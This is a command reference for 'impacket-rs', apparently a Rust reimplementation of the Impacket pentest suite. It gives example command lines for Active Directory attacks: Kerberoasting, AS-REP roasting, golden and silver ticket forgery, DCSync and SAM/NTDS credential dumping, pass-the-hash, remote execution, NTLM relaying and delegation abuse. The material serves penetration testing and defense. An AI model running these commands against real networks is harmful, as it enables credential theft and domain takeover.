# Impacket-RS Command Reference & Usage Examples

Comprehensive usage guide and practical command examples for all 74 tools included in the `impacket-rs` suite.

> **Execution Modes**: All tools can be executed via the unified binary (`impacket-rs <tool> [args]`) or via symlink (`<tool> [args]`). Both styles are fully supported.

---

## Table of Contents
1. [Active Directory & Kerberos](#1-active-directory--kerberos)
2. [Credentials, Registry & Secrets Extraction](#2-credentials-registry--secrets-extraction)
3. [Remote Execution & Administration](#3-remote-execution--administration)
4. [LDAP & Domain Infrastructure](#4-ldap--domain-infrastructure)
5. [File Sharing, Storage & SMB](#5-file-sharing-storage--smb)
6. [NTLM Relaying & Network Interception](#6-ntlm-relaying--network-interception)
7. [RPC & Reconnaissance](#7-rpc--reconnaissance)
8. [MSSQL Database Management](#8-mssql-database-management)
9. [Diagnostic & Protocol Utilities](#9-diagnostic--protocol-utilities)

---

## 1. Active Directory & Kerberos

### `GetNPUsers` (AS-REP Roasting)
Queries Active Directory for accounts with `DONT_REQ_PREAUTH` enabled and requests AS-REP tickets to crack offline.
```bash
# Query entire domain without preauth using an authenticated domain user
impacket-rs GetNPUsers corp.local/jdoe:Password123! -dc-ip 192.168.1.10 -request

# Query against a wordlist of usernames anonymously (no password required)
impacket-rs GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10 -format hashcat -outputfile asreproast.hashes

# Using Pass-the-Hash
impacket-rs GetNPUsers corp.local/admin -hashes :aad3b435b51404eeaad3b435b51404ee -request
```

### `GetUserSPNs` (Kerberoasting)
Queries Active Directory for user accounts associated with Service Principal Names (SPNs) and requests TGS tickets.
```bash
# Request TGS tickets for all SPN-enabled user accounts (outputs Hashcat mode 13100)
impacket-rs GetUserSPNs corp.local/jdoe:Password123! -dc-ip 192.168.1.10 -request -outputfile kerberoast.hashes

# Request tickets using Kerberos ticket cache (ccache)
export KRB5CCNAME=/tmp/jdoe.ccache
impacket-rs GetUserSPNs corp.local/jdoe -k -no-pass -dc-ip 192.168.1.10 -request

# Request tickets targeting a specific SPN only
impacket-rs GetUserSPNs corp.local/jdoe:Password123! -spn MSSQLSvc/db01.corp.local:1433 -request
```

### `GetADUsers`
Enumerates Active Directory user accounts, descriptions, bad password counts, and password expiration attributes.
```bash
# List all domain users
impacket-rs GetADUsers corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Filter for active accounts and export as CSV
impacket-rs GetADUsers corp.local/jdoe:Password123! -dc-ip 192.168.1.10 -all -csv -outputfile users.csv
```

### `GetADComputers`
Enumerates Active Directory domain-joined workstations, member servers, and Domain Controllers.
```bash
# List all computers in the domain with OS versions
impacket-rs GetADComputers corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Export computer accounts with IP addresses and descriptions
impacket-rs GetADComputers corp.local/jdoe:Password123! -dc-ip 192.168.1.10 -csv -outputfile computers.csv
```

### `getTGT`
Requests a Kerberos Ticket Granting Ticket (TGT) from the KDC and saves it to a `.ccache` file.
```bash
# Request TGT using plaintext password
impacket-rs getTGT corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Request TGT using NTLM hash (RC4 preauth)
impacket-rs getTGT corp.local/jdoe -hashes :aad3b435b51404eeaad3b435b51404ee -dc-ip 192.168.1.10

# Request TGT using Kerberos AES-256 key
impacket-rs getTGT corp.local/jdoe -aesKey 50810677a28e83b4c107f9c8f076c8c49e29f3f4c6e7336f2b2b1a1c9e8d7a6b -dc-ip 192.168.1.10

# Request TGT using PKINIT certificate and private key
impacket-rs getTGT corp.local/jdoe -cert user.crt -key user.key -dc-ip 192.168.1.10
```

### `getST`
Requests a Kerberos Service Ticket (TGS) via S4U2self and S4U2proxy constrained delegation.
```bash
# Request service ticket using existing TGT from ccache
export KRB5CCNAME=/tmp/websvc.ccache
impacket-rs getST corp.local/websvc$ -k -no-pass -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10

# Request service ticket using computer account NTLM hash
impacket-rs getST corp.local/websvc$ -hashes :aad3b435b51404eeaad3b435b51404ee -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10
```

### `describeTicket`
Parses and inspects a Kerberos ticket (`.ccache` or `.kirbi`), showing ticket flags, PAC claims, group memberships, and timestamps.
```bash
# Describe a Linux/Unix ccache file
impacket-rs describeTicket /tmp/krb5cc_1000

# Describe a Windows Mimikatz / Rubeus .kirbi ticket
impacket-rs describeTicket admin_ticket.kirbi
```

### `ticketConverter`
Converts Kerberos tickets between Linux/Unix ccache format and Windows Mimikatz/Rubeus `.kirbi` format.
```bash
# Convert ccache to kirbi
impacket-rs ticketConverter admin.ccache admin.kirbi

# Convert kirbi to ccache
impacket-rs ticketConverter ticket.kirbi ticket.ccache

# Convert ticket to Base64 string for Rubeus
impacket-rs ticketConverter ticket.ccache --base64
```

### `ticketer`
Generates custom Kerberos tickets (Golden Tickets, Silver Tickets, Diamond Tickets) with forged PAC structures.
```bash
# Create Golden Ticket (Krbtgt NTLM hash)
impacket-rs ticketer -domain-sid S-1-5-21-123456789-987654321-11223344 -domain corp.local -nthash 0123456789abcdef0123456789abcdef -user-id 500 Administrator

# Create Silver Ticket for CIFS service
impacket-rs ticketer -domain-sid S-1-5-21-123456789-987654321-11223344 -domain corp.local -nthash 0123456789abcdef0123456789abcdef -spn cifs/server.corp.local Administrator
```

### `getPac`
Queries the KDC to acquire the user's Privilege Attribute Certificate (PAC) and extracts the Client and Server signature verification buffers.
```bash
# Extract PAC for domain user
impacket-rs getPac -targetUser Administrator corp.local/jdoe:Password123! -dc-ip 192.168.1.10
```

### `rbcd`
Manages Resource-Based Constrained Delegation (RBCD) permissions on Active Directory computer objects (`msDS-AllowedToActOnBehalfOfOtherIdentity`).
```bash
# Grant computer account delegation rights over target server
impacket-rs rbcd -delegate-from attacker-pc$ -delegate-to fileserver$ -action write corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Inspect current RBCD configuration of target
impacket-rs rbcd -delegate-to fileserver$ -action read corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Flush/remove RBCD permissions
impacket-rs rbcd -delegate-to fileserver$ -action flush corp.local/jdoe:Password123! -dc-ip 192.168.1.10
```

### `findDelegation`
Audits Active Directory for accounts configured with Unconstrained Delegation, Constrained Delegation, or Resource-Based Constrained Delegation.
```bash
# Audit all delegation configurations in domain
impacket-rs findDelegation corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Export delegation attack graph to JSON
impacket-rs findDelegation corp.local/jdoe:Password123! -dc-ip 192.168.1.10 -json -outputfile delegation.json
```

### `trueTree`
Enumerates forest trust hierarchies and Active Directory domain trusts across bidirectional and transitive links.
```bash
# Map domain and forest trust architecture
impacket-rs trueTree corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Export trust topology tree to JSON
impacket-rs trueTree corp.local/jdoe:Password123! -dc-ip 192.168.1.10 -json -outputfile trusts.json
```

### `raiseChild`
Escalates privilege from a compromised child domain to the forest root domain by forging inter-realm trust tickets with Enterprise Admins SID history.
```bash
# Forge inter-realm ticket to escalate to forest root
impacket-rs raiseChild child.corp.local/admin:Password123! -target-exec "cmd.exe /c whoami" -dc-ip 192.168.1.10
```

### `klist`
Lists cached Kerberos tickets, server SPNs, encryption types, and ticket expiration timestamps from the active ccache file.
```bash
# Inspect default or specified ticket cache
export KRB5CCNAME=/tmp/user.ccache
impacket-rs klist
```

---

## 2. Credentials, Registry & Secrets Extraction

### `secretsdump`
Performs remote credential dumping via DRSUAPI (DCSync) or via MS-RRP/SMB SAM hive extraction.
```bash
# DCSync domain credentials via DRSUAPI
impacket-rs secretsdump corp.local/Administrator:Password123!@192.168.1.10

# DCSync specific user only
impacket-rs secretsdump corp.local/Administrator@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee -just-dc-user krbtgt

# Remote SAM and LSA secrets dump via remote registry
impacket-rs secretsdump Administrator:Password123!@192.168.1.50

# Dump with Kerberos ticket cache
export KRB5CCNAME=/tmp/admin.ccache
impacket-rs secretsdump corp.local/Administrator@dc01.corp.local -k -no-pass -just-dc
```

### `secretsdump-local`
Offline extraction of SysKey, local SAM account hashes, and LSA secrets directly from raw registry hive files.
```bash
# Dump SAM hashes using SAM and SYSTEM hives
impacket-rs secretsdump-local /path/to/SAM /path/to/SYSTEM

# Dump SAM hashes, LSA secrets, and cached domain credentials (DCC2)
impacket-rs secretsdump-local /path/to/SAM /path/to/SYSTEM /path/to/SECURITY
```

### `ntdsdump`
Fast offline parser for Active Directory `ntds.dit` databases with SYSTEM registry hive SysKey decryption.
```bash
# Dump all NTDS accounts and history
impacket-rs ntdsdump /path/to/ntds.dit /path/to/SYSTEM

# Dump active accounts only into Hashcat format
impacket-rs ntdsdump /path/to/ntds.dit /path/to/SYSTEM -active -outputfile ntds.hashes
```

### `esentutl`
Inspects, dumps tables, and extracts records from Windows Extensible Storage Engine (ESE / JET Blue) database files.
```bash
# Dump tables from ESE database
impacket-rs esentutl dump /path/to/database.edb

# Extract specific table records
impacket-rs esentutl extract /path/to/database.edb datatable
```

### `dpapi`
Inspects and decrypts Windows DPAPI master keys, credential blobs, and backup keys.
```bash
# Decrypt master key using user password and SID
impacket-rs dpapi masterkey /path/to/masterkey -sid S-1-5-21-... -password Password123!

# Decrypt DPAPI credential blob using unprotect
impacket-rs dpapi unprotect /path/to/blob -key 0123456789abcdef...
```

### `Get-GPPPassword`
Extracts and decrypts passwords stored in Group Policy Preferences (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`) using the static Microsoft AES key.
```bash
# Scan SYSVOL share on target domain controller
impacket-rs Get-GPPPassword corp.local/jdoe:Password123!@192.168.1.10

# Scan SYSVOL using Pass-the-Hash
impacket-rs Get-GPPPassword corp.local/jdoe@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee
```

### `samrdump`
Enumerates local security accounts, user RID mappings, group memberships, and domain aliases via MS-SAMR DCE/RPC.
```bash
# Enumerate local users and groups on target
impacket-rs samrdump Administrator:Password123!@192.168.1.50

# Enumerate using guest or anonymous access
impacket-rs samrdump 192.168.1.50 -no-pass
```

### `samedit`
Modifies user account password hashes and flags inside an offline SAM registry hive file.
```bash
# Set new NT hash for Administrator (RID 500)
impacket-rs samedit /path/to/SAM /path/to/SYSTEM 500 -nthash 31d6cfe0d16ae931b73c59d7e0c089c0

# Enable disabled user account
impacket-rs samedit /path/to/SAM /path/to/SYSTEM 500 -enable
```

### `changepasswd`
Changes or resets user passwords over SAMR DCE/RPC or Kerberos kpasswd (port 464).
```bash
# Change password over SAMR
impacket-rs changepasswd corp.local/jdoe:OldPassword! -newpass NewPassword123! -target 192.168.1.10

# Reset user password with administrative rights
impacket-rs changepasswd corp.local/admin:Password123! -targetuser targetuser -newpass NewPassword123! -target 192.168.1.10
```

### `smbpasswd`
Convenience command to update account passwords directly via SMB/SAMR protocol.
```bash
# Update SMB password
impacket-rs smbpasswd corp.local/jdoe:OldPassword!@192.168.1.10 -newpass NewPassword123!
```

### `reg`
Queries, adds, deletes, and exports Windows Registry keys and values remotely via MS-RRP.
```bash
# Query registry key remotely
impacket-rs reg Administrator:Password123!@192.168.1.50 query -key "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"

# Add a registry value
impacket-rs reg Administrator:Password123!@192.168.1.50 add -key "HKLM\\Software\\Test" -v "Debug" -d 1 -t REG_DWORD

# Export subkey tree
impacket-rs reg Administrator:Password123!@192.168.1.50 export -key "HKLM\\SYSTEM\\CurrentControlSet\\Services" -o services.reg
```

### `registry-read`
Reads and extracts values from remote Windows Registry keys via SMB named pipes.
```bash
# Read remote registry value
impacket-rs registry-read Administrator:Password123!@192.168.1.50 -k "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName" -v ComputerName
```

---

## 3. Remote Execution & Administration

### `psexec`
Lightweight remote execution via SMB named pipe service installation (MS-SCMR).
```bash
# Interactive shell on target
impacket-rs psexec Administrator:Password123!@192.168.1.50

# Execute single command and exit
impacket-rs psexec Administrator:Password123!@192.168.1.50 -c "ipconfig /all"

# Pass-the-Hash execution
impacket-rs psexec Administrator@192.168.1.50 -hashes :aad3b435b51404eeaad3b435b51404ee

# Kerberos authentication
export KRB5CCNAME=/tmp/admin.ccache
impacket-rs psexec corp.local/Administrator@server01.corp.local -k -no-pass
```

### `smbexec`
Stealthy remote command execution via SMB without leaving a running service binary on disk.
```bash
# Interactive pseudo-shell
impacket-rs smbexec Administrator:Password123!@192.168.1.50

# Run specific command
impacket-rs smbexec Administrator:Password123!@192.168.1.50 -c "whoami /priv"
```

### `atexec`
Executes remote commands via the Windows Task Scheduler service (MS-TSCH / At schedule).
```bash
# Execute command via Task Scheduler
impacket-rs atexec Administrator:Password123!@192.168.1.50 "whoami"

# Pass-the-Hash execution
impacket-rs atexec Administrator@192.168.1.50 "systeminfo" -hashes :aad3b435b51404eeaad3b435b51404ee
```

### `atq`
Queries and lists scheduled tasks on a remote host via MS-TSCH.
```bash
# List scheduled tasks on remote host
impacket-rs atq Administrator:Password123!@192.168.1.50
```

### `wmiexec`
Executes commands through Windows Management Instrumentation (WMI / DCOM) without creating a service.
```bash
# Interactive WMI shell
impacket-rs wmiexec Administrator:Password123!@192.168.1.50

# Single command execution
impacket-rs wmiexec Administrator:Password123!@192.168.1.50 "net user"

# Silent execution without stdout redirection
impacket-rs wmiexec Administrator:Password123!@192.168.1.50 -nooutput "calc.exe"
```

### `dcomexec`
Executes commands via DCOM object methods (MMC20.Application, ShellWindows, ShellBrowserWindow).
```bash
# Execute via MMC20.Application
impacket-rs dcomexec Administrator:Password123!@192.168.1.50 -object MMC20 "cmd.exe /c dir"

# Execute via ShellWindows
impacket-rs dcomexec Administrator:Password123!@192.168.1.50 -object ShellWindows "powershell.exe -enc ..."
```

### `services`
Remotely manages, starts, stops, creates, and reconfigures Windows Services via Service Control Manager (MS-SCMR).
```bash
# List all services on remote host
impacket-rs services Administrator:Password123!@192.168.1.50 list

# Start a service
impacket-rs services Administrator:Password123!@192.168.1.50 start -name Spooler

# Query service configuration
impacket-rs services Administrator:Password123!@192.168.1.50 config -name LanmanServer
```

### `net`
Performs Windows network administrative tasks (user enumeration, share discovery, local group enumeration) via DCE/RPC.
```bash
# Enumerate local users
impacket-rs net Administrator:Password123!@192.168.1.50 user

# Enumerate domain shares
impacket-rs net corp.local/jdoe:Password123!@192.168.1.10 share
```

### `wmipersist`
Manages WMI permanent event subscriptions for administrative persistence (`__EventFilter`, `CommandLineEventConsumer`, `__FilterToConsumerBinding`).
```bash
# List permanent WMI event subscriptions
impacket-rs wmipersist Administrator:Password123!@192.168.1.50 -action list

# Remove persistence subscription
impacket-rs wmipersist Administrator:Password123!@192.168.1.50 -action remove -name "BackdoorFilter"
```

### `eventlog`
Queries, reads, and exports Windows Event Logs remotely via MS-EVEN / MS-EVEN6.
```bash
# Read security event logs
impacket-rs eventlog Administrator:Password123!@192.168.1.50 -log Security -count 50
```

---

## 4. LDAP & Domain Infrastructure

### `CheckLDAPStatus`
Probes Active Directory Domain Controllers for LDAP / LDAPS availability, Channel Binding tokens, and Signing requirements.
```bash
# Check LDAP signing and channel binding status
impacket-rs CheckLDAPStatus corp.local/jdoe:Password123!@192.168.1.10

# Test over LDAPS (port 636)
impacket-rs CheckLDAPStatus corp.local/jdoe:Password123!@192.168.1.10 -ldaps
```

### `addcomputer`
Adds a new computer object to Active Directory via SAMR or LDAP using default machine account quota permissions (`ms-DS-MachineAccountQuota`).
```bash
# Add a new computer account to domain
impacket-rs addcomputer corp.local/jdoe:Password123! -computer-name NEWPC$ -computer-pass NewPassword123! -dc-ip 192.168.1.10
```

### `dacledit`
Inspects, modifies, and restores Discretionary Access Control Lists (DACLs) on Active Directory objects.
```bash
# Grant WriteDacl access to a user over an OU
impacket-rs dacledit -action write -rights WriteDacl -principal jdoe -target-dn "OU=Servers,DC=corp,DC=local" corp.local/admin:Password123! -dc-ip 192.168.1.10

# Read permissions on target object
impacket-rs dacledit -action read -target-dn "CN=Administrator,CN=Users,DC=corp,DC=local" corp.local/jdoe:Password123! -dc-ip 192.168.1.10
```

### `owneredit`
Reads or transfers ownership of Active Directory objects.
```bash
# Change owner of an AD object
impacket-rs owneredit -action write -new-owner jdoe -target-dn "CN=TargetServer,CN=Computers,DC=corp,DC=local" corp.local/admin:Password123! -dc-ip 192.168.1.10
```

### `dnstool`
Queries, adds, modifies, and deletes DNS records stored in Active Directory Integrated DNS (ADIDNS).
```bash
# Query existing DNS record
impacket-rs dnstool -action query -record server01 corp.local/jdoe:Password123! -zone corp.local -dc-ip 192.168.1.10

# Add new A record to ADIDNS
impacket-rs dnstool -action add -record myhost -data 192.168.1.200 corp.local/jdoe:Password123! -zone corp.local -dc-ip 192.168.1.10
```

### `ldapsearch`
Performs LDAP searches with support for arbitrary filters, paging, and attribute projections.
```bash
# Query all domain admins
impacket-rs ldapsearch -filter "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)" -attributes sAMAccountName,mail corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Search with anonymous / unauthenticated bind
impacket-rs ldapsearch -filter "(objectClass=*)" -base "DC=corp,DC=local" -no-pass -dc-ip 192.168.1.10
```

### `ldapclient` / `ldap_shell`
Interactive LDAP command shell for navigating directory trees, inspecting schema, and modifying attributes.
```bash
# Launch interactive LDAP shell
impacket-rs ldapclient corp.local/jdoe:Password123!@192.168.1.10
```

### `GetLAPSPassword`
Retrieves local administrator passwords stored in Active Directory via legacy LAPS (`ms-Mcs-AdmPwd`) or Windows LAPS (`msLAPS-Password`).
```bash
# Retrieve LAPS password for target computer
impacket-rs GetLAPSPassword corp.local/jdoe:Password123! -target-computer SERVER01$ -dc-ip 192.168.1.10
```

---

## 5. File Sharing, Storage & SMB

### `smbclient`
Full-featured interactive SMB1/SMB2/SMB3 client supporting file browsing, uploads, downloads, and batch scripting.
```bash
# Interactive SMB client shell
impacket-rs smbclient Administrator:Password123!@192.168.1.50

# Connect to specific share directly
impacket-rs smbclient Administrator:Password123!@192.168.1.50/C$

# Execute single command and exit
impacket-rs smbclient Administrator:Password123!@192.168.1.50/C$ -c "dir"

# Run non-interactive batch script
impacket-rs smbclient Administrator:Password123!@192.168.1.50/C$ -batch upload_commands.txt
```

### `smbserver`
Hosts a local SMB share supporting NTLMv1/v2 authentication capture, anonymous access, and file transfer.
```bash
# Host anonymous read-write share
impacket-rs smbserver SHARE /tmp/shared_folder -smb2support

# Host share with credentials required
impacket-rs smbserver SHARE /tmp/shared_folder -username admin -password SecretPass -smb2support
```

### `attrib`
Queries or modifies Windows file attributes (Read-Only, Hidden, System, Archive) over SMB.
```bash
# View file attributes on share
impacket-rs attrib Administrator:Password123!@192.168.1.50/C$ "\\Windows\\System32\\calc.exe"

# Set hidden attribute
impacket-rs attrib Administrator:Password123!@192.168.1.50/C$ "\\Users\\Public\\test.txt" +h
```

### `filetime`
Reads or modifies Creation, Last Access, Last Write, and Change timestamps of remote files over SMB.
```bash
# View timestamps of remote file
impacket-rs filetime Administrator:Password123!@192.168.1.50/C$ "\\Windows\\notepad.exe"

# Clone timestamps from notepad.exe to target file
impacket-rs filetime Administrator:Password123!@192.168.1.50/C$ "\\temp\\payload.exe" -clone "\\Windows\\notepad.exe"
```

### `dfsclient`
Navigates and resolves Distributed File System (DFS) namespace referrals and junctions.
```bash
# Resolve DFS namespace referrals
impacket-rs dfsclient corp.local/jdoe:Password123!@192.168.1.10 -path "\\\\corp.local\\SharedDocs"
```

### `wspsearch`
Queries files on remote Windows machines using the Windows Search Protocol (MS-WSP / GSS).
```bash
# Search file contents for sensitive patterns
impacket-rs wspsearch Administrator:Password123!@192.168.1.50 -query "password"
```

### `split`
Splits large files (such as database dumps, NTDS files, or memory dumps) into manageable chunks for transmission.
```bash
# Split large file into 100MB pieces
impacket-rs split /path/to/large_ntds.dit -b 100M -o chunk_
```

---

## 6. NTLM Relaying & Network Interception

### `ntlmrelayx`
High-concurrency cross-protocol NTLM relay engine supporting HTTP, SMB, LDAP, and MSSQL.
```bash
# Relay incoming connections to an LDAP server to DCSync or create computer
impacket-rs ntlmrelayx -t ldap://192.168.1.10 --escalate-user jdoe

# Relay across multiple target hosts loaded from file
impacket-rs ntlmrelayx -tf targets.txt -smb2support

# Relay HTTP to SMB and execute command
impacket-rs ntlmrelayx -t smb://192.168.1.50 -c "whoami"
```

### `sniffer`
Raw network packet capture tool with dissectors for SMB, Kerberos, DNS, and DCE/RPC traffic.
```bash
# Sniff traffic on default network interface
impacket-rs sniffer -i eth0

# Parse traffic from an offline PCAP capture file
impacket-rs sniffer -r capture.pcap
```

### `tracer`
TCP traceroute tool supporting SYN and ACK probes against Windows network services.
```bash
# Trace route to SMB port 445
impacket-rs tracer 192.168.1.50 -p 445
```

### `ping` / `ping6`
ICMP echo diagnostic utility with configurable packet padding and timing.
```bash
# Ping IPv4 host
impacket-rs ping 192.168.1.50

# Ping IPv6 host
impacket-rs ping6 fe80::1
```

### `rdp_check`
Probes RDP availability (port 3389) and determines supported encryption algorithms (CredSSP, TLS, NLA).
```bash
# Check target host RDP configuration
impacket-rs rdp_check 192.168.1.50
```

### `mqtt_check`
Verifies MQTT broker reachability and authentication requirements.
```bash
# Check MQTT service on port 1883
impacket-rs mqtt_check 192.168.1.50 -p 1883
```

---

## 7. RPC & Reconnaissance

### `DumpNTLMInfo`
Sends an anonymous NTLMSSP negotiate packet over SMB or HTTP to extract Windows build numbers, domain names, computer names, and DNS forest names.
```bash
# Query target Windows machine over SMB (port 445)
impacket-rs DumpNTLMInfo 192.168.1.50

# Query target web server over HTTP (port 80)
impacket-rs DumpNTLMInfo http://192.168.1.50
```

### `rpcdump`
Queries the DCE/RPC Endpoint Mapper (port 135) to enumerate all registered RPC interfaces, protocol towers, and listening endpoints.
```bash
# Enumerate all RPC endpoints on target
impacket-rs rpcdump 192.168.1.50

# Dump with authentication
impacket-rs rpcdump Administrator:Password123!@192.168.1.50
```

### `rpcmap`
Probes and scans DCE/RPC endpoints for supported interface UUIDs.
```bash
# Scan target for specific RPC interface
impacket-rs rpcmap 192.168.1.50 -uuid 12345778-1234-abcd-ef00-0123456789ac
```

### `oxidquery`
Queries the DCOM Object Exporter (OXID resolver) via RPC port 135 to reveal all local network interfaces and IP addresses on a multihomed host.
```bash
# Enumerate network adapters and internal IPs
impacket-rs oxidquery 192.168.1.50
```

### `lookupsid`
Performs SID lookups and user/group enumeration through LSA RPC brute forcing.
```bash
# Enumerate user accounts and SIDs on target
impacket-rs lookupsid Administrator:Password123!@192.168.1.50

# Enumerate anonymously
impacket-rs lookupsid 192.168.1.50 -no-pass
```

### `netview`
Enumerates active sessions, logged-on users, and accessible file shares across a domain or target list.
```bash
# Enumerate domain sessions and shares
impacket-rs netview corp.local/jdoe:Password123! -dc-ip 192.168.1.10

# Scan list of hosts from file
impacket-rs netview corp.local/jdoe:Password123! -targets targets.txt
```

### `machine_role`
Identifies whether a remote Windows host is a standalone workstation, member server, or Domain Controller.
```bash
# Identify machine role
impacket-rs machine_role 192.168.1.50
```

### `getArch`
Queries the remote architecture (x86, x64, ARM64) of a target Windows system via MS-WKST or MS-SCMR.
```bash
# Check remote machine architecture
impacket-rs getArch 192.168.1.50
```

### `tstool`
Queries Terminal Services (Remote Desktop) active sessions and processes.
```bash
# List active RDP user sessions
impacket-rs tstool Administrator:Password123!@192.168.1.50
```

### `wmiquery`
Executes raw WQL queries against the WMI repository on a remote host.
```bash
# Query operating system details via WQL
impacket-rs wmiquery Administrator:Password123!@192.168.1.50 -q "SELECT Caption, Version, OSArchitecture FROM Win32_OperatingSystem"

# Query installed hotfixes
impacket-rs wmiquery Administrator:Password123!@192.168.1.50 -q "SELECT HotFixID, InstalledOn FROM Win32_QuickFixEngineering"
```

---

## 8. MSSQL Database Management

### `mssqlclient`
Interactive SQL console for Microsoft SQL Server instances supporting SQL authentication, Windows NTLM authentication, Kerberos, and command execution (`xp_cmdshell`).
```bash
# Connect with Windows NTLM authentication
impacket-rs mssqlclient corp.local/dbadmin:Password123!@192.168.1.80 -windows-auth

# Connect with SQL server authentication (sa user)
impacket-rs mssqlclient sa:Password123!@192.168.1.80

# Connect using Kerberos ticket
export KRB5CCNAME=/tmp/dbadmin.ccache
impacket-rs mssqlclient corp.local/dbadmin@db01.corp.local -k -no-pass

# Execute query directly and exit
impacket-rs mssqlclient sa:Password123!@192.168.1.80 -q "SELECT @@VERSION"
```

### `mssqlinstance`
Discovers Microsoft SQL Server instances and queries port mappings via the SQL Server Browser Service (UDP 1434).
```bash
# Discover SQL instances on target host
impacket-rs mssqlinstance 192.168.1.80
```

### `checkMSSQLStatus`
Verifies reachability, authentication requirements, and TLS negotiation of an MSSQL instance.
```bash
# Check MSSQL server status
impacket-rs checkMSSQLStatus 192.168.1.80
```

---

## 9. Diagnostic & Protocol Utilities

### `compat-matrix`
Displays the full compatibility matrix across Windows eras (Windows 2000 through Windows Server 2025).
```bash
impacket-rs compat-matrix
```

### `parse-target`
Tests and verifies target string parsing logic (`DOMAIN/USER[:PASSWORD]@TARGET`).
```bash
impacket-rs parse-target "corp.local/jdoe:Pass123!@192.168.1.10"
```

### `ntlm-hash`
Generates LM and NT password hashes from a plaintext string.
```bash
impacket-rs ntlm-hash "Password123!"
```

### `krb5-asreq`
Constructs and displays a raw Kerberos AS-REQ packet for protocol inspection.
```bash
impacket-rs krb5-asreq corp.local jdoe
```

### `smb-negotiate`
Tests SMB dialect negotiation against a target server.
```bash
impacket-rs smb-negotiate 192.168.1.50
```

### `rpc-interfaces`
Lists all known Microsoft DCE/RPC interface UUIDs and their symbolic names built into `impacket-rs`.
```bash
impacket-rs rpc-interfaces
```

### `bench-ndr`
Runs high-precision performance benchmarks on the pure-Rust compile-time NDR serialization engine.
```bash
impacket-rs bench-ndr 1000000
```
